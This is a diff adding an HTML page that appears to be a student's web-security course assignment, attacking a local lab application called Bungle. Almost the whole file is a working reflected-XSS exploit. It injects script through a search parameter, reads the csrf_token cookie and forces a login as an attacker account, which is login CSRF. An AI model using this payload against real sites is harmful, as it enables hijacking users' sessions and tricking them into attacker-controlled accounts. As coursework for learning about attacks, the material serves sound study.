@@ -1,0 +1,67 @@
+<!-- 
+    List of people I discussed the project with: Yuchan Kim, Seungwon Burm, Office hour help from TAs and other students attended 9/30 (Friday) office hour
+
+    List of references used:
+    1. https://owasp.org/www-community/attacks/csrf
+	2. https://portswigger.net/web-security/csrf
+	3. https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/cross-site-request-forgery-in-login-form-invicti/
+	4. https://www.w3schools.com/js/js_ajax_intro.asp
+	5. https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie
+-->
+<html>
+    <head>
+		<meta charset="utf-8">
+		<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+		<script>
+
+		function payload(adversary) { 
+
+		
+			function proxy(href) {
+				$("html").load(href, function(){
+					var cookieArray = document.cookie.split("; ");
+					var cookieVal = "";
+					for (var x = 0; x < cookieArray.length; x++){
+						var token = cookieArray[x].split("=");
+						if(token[0].startsWith("csrf_token")){
+							cookieVal = token[1];
+							break;
+						}
+					}
+					$("html").show();
+                
+					$.ajax({ type: "POST", url: "http://localhost/project2/login", data: {'username':"adversary", 'password':"h4ck3r",'csrf_token':cookieVal}
+                	})
+					
+
+		    	});
+        	}
+			
+			$("html").hide();
+			proxy("./");
+			
+			
+
+		}
+		function makeLink(xssdefense, target, adversary) {
+			if (xssdefense == 0) {
+                    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<script" + ">" + payload.toString() +
+                        ";payload(\"" + adversary + "\");</script" + ">");
+			} else {
+			// Implement code to defeat XSS defenses here.
+			}
+		}
+		var xssdefense = 0;
+		var target = "http://localhost/project2/";
+		var adversary = "http://localhost:31337/";
+		$(function() {
+			var url = makeLink(xssdefense, target, adversary);
+			
+			$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+		});
+		</script>
+	</head>
+	<body class="vsc-initialized">
+		<h3></h3>
+	</body>
+</html>
